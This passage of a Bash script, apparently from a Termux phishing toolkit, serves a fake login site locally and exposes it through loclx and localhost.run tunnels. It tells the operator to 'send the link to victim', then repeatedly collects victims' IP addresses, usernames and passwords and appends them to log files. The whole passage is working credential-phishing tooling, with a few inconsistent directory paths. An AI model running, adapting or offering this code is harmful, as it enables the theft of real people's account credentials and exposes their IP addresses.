printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
read loclx_subdomain
loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
if [[ $loclx_custom_subdomain == true ]]; then

./.htr/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &

sleep 8

else
./.termuxhackz/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
sleep 8
fi
loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $loclx_link

datafound
}

start_localhostrun() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C to View Login Creds \e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
ssh -R 80:localhost:4545 ssh.localhost.run

printf "\e[0m\n"

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;93m Login Info \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
printf "\e[0m\n"
while [ true ]; do


if [[ -e ".termuxhackz/www/ip.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' .termuxhackz/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .termuxhackz/www/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .termuxhackz/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
rm -rf .termuxhackz/www/usernames.txt
fi
sleep 0.75

done

}

grab_ip() {

ip=$(grep -a 'IP:' .termuxhackz/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
printf "\n"
cat .termuxhackz/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .termuxhackz/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .termuxhackz/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .termuxhackz/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do


if [[ -e ".termuxhackz/www/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .termuxhackz/www/ip.txt
fi
sleep 0.75
if [[ -e ".termuxhackz/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grab_creds
rm -rf .termuxhackz/www/usernames.txt
fi
sleep 0.75


done 

}

banner
dependencies
menu

